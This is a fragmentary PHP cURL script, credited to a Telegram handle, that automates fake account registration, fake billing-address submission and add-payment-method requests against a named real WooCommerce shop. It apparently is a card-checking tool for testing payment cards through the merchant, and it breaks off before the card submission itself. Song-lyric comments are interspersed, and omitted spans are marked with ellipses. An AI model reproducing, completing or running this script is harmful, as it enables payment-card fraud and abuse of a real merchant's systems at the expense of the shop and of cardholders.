...
//API by t.me/@Raizo666 mamatay ang mag leak
...
//Heartache - One OK Rock //fucking why!??

    $ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => 'https://www.theeasternbeacon.com/my-account/add-payment-method/',
...
//I made you sad for a long time. I must have hurt you.
...
curl_setopt_array($ch, array(
    ...
    CURLOPT_HTTPHEADER => array(
        ...
        'origin: https://www.theeasternbeacon.com',
        'referer: https://www.theeasternbeacon.com/my-account/add-payment-method/',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
    ),
    CURLOPT_POSTFIELDS => "email=$str@gmail.com&password=akatsuki1&woocommerce-register-nonce=$register_nonce&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&register=Register",
));
...
//I tried to recover the unforgettable days to stay close to each other.
    ...
    $ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => 'https://www.theeasternbeacon.com/my-account/edit-address/billing/',
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_COOKIEJAR => getcwd() . "/cookie.txt",
    CURLOPT_COOKIEFILE => getcwd() . "/cookie.txt",
    ...
    CURLOPT_HTTPHEADER => array(
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'referer: https://www.theeasternbeacon.com/my-account/edit-address/',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
    )
));
...
curl_setopt_array($ch, array(
    ...
    CURLOPT_HTTPHEADER => array(
        ...
        'content-type: application/x-www-form-urlencoded',
        'origin: https://www.theeasternbeacon.com',
        'referer: https://www.theeasternbeacon.com/my-account/edit-address/billing/',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
    ),
    CURLOPT_POSTFIELDS => "billing_first_name=Kaizer&billing_last_name=Ogedei&billing_company=&billing_country=US&billing_address_1=23+hayward&billing_address_2=&billing_city=street&billing_state=CA&billing_postcode=90210&billing_phone=9222312315&billing_email=$str@gmail.com&save_address=Save+address&woocommerce-edit-address-nonce=$edit_address_nonce&_wp_http_referer=%2Fmy-account%2Fedit-address%2Fbilling%2F&action=edit_address",
));
...
curl_setopt_array($ch, array(
    ...
    $ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => 'https://www.theeasternbeacon.com/wp-admin/admin-ajax.php',
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_COOKIEJAR => getcwd() . "/cookie.txt",
    CURLOPT_COOKIEFILE => getcwd() . "/cookie.txt",
